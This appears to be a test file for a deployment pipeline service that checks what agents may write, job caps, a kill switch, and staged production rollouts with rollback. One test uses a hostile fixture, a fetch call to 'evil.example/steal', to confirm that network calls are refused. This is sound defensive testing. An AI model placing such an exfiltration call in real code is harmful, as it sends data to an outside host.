import { describe, expect, test } from 'bun:test';
import { ServiceError } from '../src/errors.ts';
import { parseMarker } from '../src/drivers.ts';
import { changeFiles, fakeDigest, makeServices } from './support.ts';
import type { Services } from './support.ts';
import type { ChangeFile } from '../src/shared/pipeline/types.ts';

const person = { id: 'guest-1', name: 'Ada' };

async function run(services: Services, kind: Parameters<Services['jobs']['start']>[0]['kind'], digest: string, files: ChangeFile[], startedBy = person) {
  const job = await services.jobs.start({ ticket: 't-1', ticketKey: 1, kind, inputDigest: digest, files, startedBy });
  services.advance(1200);
  return (await services.jobs.get(job.id))!;
}

async function completeChangeSet(services: Services, digest: string, files: ChangeFile[]) {
  const build = await run(services, 'build', digest, files);
  expect(build.state).toBe('passed');
  const unit = await run(services, 'unit', digest, files);
  expect(unit.state).toBe('passed');
  const e2e = await run(services, 'e2e', digest, files);
  expect(e2e.state).toBe('passed');
  const release = await run(services, 'release_build', digest, files);
  expect(release.state).toBe('passed');
  const scan = await run(services, 'scan', digest, files);
  expect(scan.state).toBe('passed');
  return { build, unit, e2e, release, scan };
}

describe('the pipeline service', () => {
  test('refuses what an agent may not write, and a change set written against old code', async () => {
    const services = makeServices();
    const files = await changeFiles(services, [{ path: 'sample-app/Dockerfile', role: 'src', content: 'FROM node:22\n' }]);
    await expect(services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('a'), files, startedBy: person })).rejects.toThrow(ServiceError);

    const hostile = await changeFiles(services, [{ path: 'sample-app/src/evil.ts', content: "await fetch('https://evil.example/steal');\n" }]);
    await expect(services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('b'), files: hostile, startedBy: person })).rejects.toThrow(/cannot use network call/);

    const stale = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [];\n' }]);
    stale[0].baseSha = 'f'.repeat(64);
    await expect(services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('c'), files: stale, startedBy: person })).rejects.toThrow(/changed on main/);
  });

  test('a build runs to passed, and a marker in its log becomes the summary', async () => {
    const services = makeServices();
    const files = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [1];\n' }]);
    const digest = fakeDigest('unit');
    const unit = await run(services, 'unit', digest, files);
    expect(unit.state).toBe('passed');
    expect(unit.summary?.coveragePct).toBe(82);
    expect(unit.summary?.passed).toBe(13);
    const log = await services.jobs.log(unit.id, 0);
    expect(log.done).toBe(true);
    expect(log.text).toContain('PIPELINE_RESULT');
  });

  test('a release image needs the tests first, and a scan needs the image', async () => {
    const services = makeServices();
    const files = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [1];\n' }]);
    const digest = fakeDigest('release');
    await expect(run(services, 'release_build', digest, files)).rejects.toThrow(/unit and end-to-end/);
    await run(services, 'unit', digest, files);
    await run(services, 'e2e', digest, files);
    await expect(run(services, 'scan', digest, files)).rejects.toThrow(/release image first/);
    const release = await run(services, 'release_build', digest, files);
    expect(release.imageDigest).toMatch(/^sha256:/);
    const scan = await run(services, 'scan', digest, files);
    expect(scan.summary?.scanSeverity).toBe('LOW');
  });

  test('two jobs at a time, and the day and hour caps hold', async () => {
    const services = makeServices({ cfg: { limits: { ...makeServices().cfg.limits, maxConcurrent: 1 } } });
    const files = await changeFiles(services, [{ path: 'sample-app/src/a.ts', content: 'export const a = 1;\n' }]);
    const first = await services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('one'), files, startedBy: { id: 'guest-1', name: 'Ada' } });
    expect(first.state).toBe('queued');
    await expect(services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('two'), files, startedBy: { id: 'guest-2', name: 'Bo' } })).rejects.toThrow(/already running/);
    services.advance(2000);
    expect((await services.jobs.get(first.id))?.state).toBe('passed');

    const capped = makeServices({ cfg: { limits: { ...makeServices().cfg.limits, jobsPerGuestHour: 1, maxConcurrent: 5 } } });
    const cappedFiles = await changeFiles(capped, [{ path: 'sample-app/src/b.ts', content: 'export const b = 1;\n' }]);
    await capped.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('three'), files: cappedFiles, startedBy: { id: 'guest-1', name: 'Ada' } });
    capped.advance(2000);
    await expect(capped.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('four'), files: cappedFiles, startedBy: { id: 'guest-1', name: 'Ada' } })).rejects.toThrow(/this hour/);
  });

  test('a job can be cancelled, and the kill switch stops new work', async () => {
    const services = makeServices();
    const files = await changeFiles(services, [{ path: 'sample-app/src/c.ts', content: 'export const c = 1;\n' }]);
    const job = await services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('cancel'), files, startedBy: person });
    expect((await services.jobs.cancel(job.id))?.state).toBe('cancelled');
    await services.budget.setKillSwitch(true);
    await expect(services.jobs.start({ ticket: 't-1', ticketKey: 1, kind: 'build', inputDigest: fakeDigest('kill'), files, startedBy: person })).rejects.toThrow(/switched off/);
  });

  test('the rollout goes to staging, then production in steps, and moves the trunk at 100%', async () => {
    let revision = '';
    const services = makeServices({
      smoke: async () => ({ ok: true, errors: 0, errorRate: 0, p95Ms: 90, byRevision: {}, failures: [] }),
      probe: async () => ({ requests: 40, errors: 0, errorRate: 0, p95Ms: 120, byRevision: revision ? { [revision]: { requests: 40, errors: 0, p95Ms: 120 } } : {} }),
    });
    const files = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [1];\n' }]);
    const digest = fakeDigest('rollout');
    const { release } = await completeChangeSet(services, digest, files);
    const image = (await services.jobs.get(release.id))!.imageDigest!;

    const staging = await services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'staging', imageDigest: image, inputDigest: digest, plan: [10, 50, 100], thresholds: { errorRateMax: 0.01, p95MsMax: 800, scanRequired: true, scanMaxSeverity: 'MEDIUM' }, startedBy: person });
    expect(staging.state).toBe('complete');

    const production = await services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'production', imageDigest: image, inputDigest: digest, plan: [10, 50, 100], thresholds: { errorRateMax: 0.01, p95MsMax: 800, scanRequired: true, scanMaxSeverity: 'MEDIUM' }, startedBy: person });
    expect(production.state).toBe('candidate');
    revision = production.revision.split('/').pop()!;
    const first = await services.rollouts.step(production.id, person);
    expect(first.trafficPct).toBe(10);
    expect(first.state).toBe('canary');
    const second = await services.rollouts.step(production.id, person);
    expect(second.trafficPct).toBe(50);
    const third = await services.rollouts.step(production.id, person);
    expect(third.state).toBe('complete');
    expect(third.trafficPct).toBe(100);
    expect(await services.source.read('sample-app/src/api/orders.ts')).toBe('export const orders = [1];\n');
    expect(await services.source.rev()).toBe(1);
  });

  test('a candidate that fails under load is rolled back and the trunk stays put', async () => {
    let revision = '';
    const services = makeServices({
      smoke: async () => ({ ok: true, errors: 0, errorRate: 0, p95Ms: 90, byRevision: {}, failures: [] }),
      probe: async () => ({ requests: 40, errors: 30, errorRate: 0.75, p95Ms: 1200, byRevision: revision ? { [revision]: { requests: 40, errors: 30, p95Ms: 1200 } } : {} }),
    });
    const files = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [2];\n' }]);
    const digest = fakeDigest('bad');
    const { release } = await completeChangeSet(services, digest, files);
    const image = (await services.jobs.get(release.id))!.imageDigest!;
    await services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'staging', imageDigest: image, inputDigest: digest, plan: [10, 50, 100], thresholds: { errorRateMax: 0.01, p95MsMax: 800, scanRequired: true, scanMaxSeverity: 'MEDIUM' }, startedBy: person });
    const production = await services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'production', imageDigest: image, inputDigest: digest, plan: [10, 50, 100], thresholds: { errorRateMax: 0.01, p95MsMax: 800, scanRequired: true, scanMaxSeverity: 'MEDIUM' }, startedBy: person });
    revision = production.revision.split('/').pop()!;
    const failed = await services.rollouts.step(production.id, person);
    expect(failed.state).toBe('rolled_back');
    expect(failed.trafficPct).toBe(0);
    expect(failed.checks.at(-1)?.reason).toMatch(/errors under load/);
    expect(await services.source.rev()).toBe(0);
  });

  test('production waits for staging, and one rollout per environment', async () => {
    const services = makeServices({ smoke: async () => ({ ok: true, errors: 0, errorRate: 0, p95Ms: 90, byRevision: {}, failures: [] }) });
    const files = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [3];\n' }]);
    const digest = fakeDigest('order');
    const { release } = await completeChangeSet(services, digest, files);
    const image = (await services.jobs.get(release.id))!.imageDigest!;
    const thresholds = { errorRateMax: 0.01, p95MsMax: 800, scanRequired: true, scanMaxSeverity: 'MEDIUM' as const };
    await expect(services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'production', imageDigest: image, inputDigest: digest, plan: [10, 100], thresholds, startedBy: person })).rejects.toThrow(/staging first/);
    const staging = await services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'staging', imageDigest: image, inputDigest: digest, plan: [10, 100], thresholds, startedBy: person });
    expect(staging.state).toBe('complete');
    const production = await services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'production', imageDigest: image, inputDigest: digest, plan: [10, 100], thresholds, startedBy: person });
    await expect(services.rollouts.start({ ticket: 't-1', ticketKey: 1, service: 'production', imageDigest: image, inputDigest: digest, plan: [10, 100], thresholds, startedBy: person })).rejects.toThrow(/still going/);
    expect((await services.rollouts.rollback(production.id, person)).state).toBe('rolled_back');
  });

  test('a reset clears the jobs, the rollouts and the trunk', async () => {
    const services = makeServices();
    const files = await changeFiles(services, [{ path: 'sample-app/src/api/orders.ts', content: 'export const orders = [4];\n' }]);
    await services.source.commit(files);
    expect(await services.source.rev()).toBe(1);
    await services.rollouts.reset();
    await services.jobs.reset();
    await services.budget.reset();
    await services.locks.clear();
    await services.source.reset();
    expect(await services.jobs.list()).toEqual([]);
    expect(await services.source.rev()).toBe(0);
    expect(await services.source.read('sample-app/src/api/orders.ts')).toBe("export const orders = [{ id: 'o-1001' }];\n");
  });

  test('the result markers are read from the last line that carries one', () => {
    const text = 'noise\nPIPELINE_RESULT: {"ok":true,"passed":3}\nmore\n';
    expect(parseMarker<{ passed: number }>(text, 'PIPELINE_RESULT')?.passed).toBe(3);
    expect(parseMarker(text, 'NOTHING')).toBeNull();
  });
});
